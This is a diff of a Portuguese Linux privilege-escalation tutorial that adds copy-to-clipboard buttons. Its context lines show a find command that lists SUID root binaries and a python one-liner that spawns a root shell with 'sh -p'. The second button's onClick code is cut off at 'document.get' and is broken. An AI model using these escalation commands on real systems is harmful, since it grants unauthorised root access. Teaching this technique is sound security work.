@@ -35,6 +35,7 @@ Para isso usaremos uma ferramenta que já vem com o linux chamada find, vamos ao
 ```sh
 find / -user root -perm /4000 2>/dev/null
 ```
+<button class="copy" onClick="copy_to_clip2('find / -user root -perm /4000 2>/dev/null')">Copiar comando</button>
 
 Explicando o comando:
 
@@ -98,5 +99,6 @@ reddyyz@fsociety:~$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 root
 # 
 ```
+<button class="copy" onClick="document.get">Copiar comando</button>
 
 E conseguimos escalar nossos privilégios com sucesso!
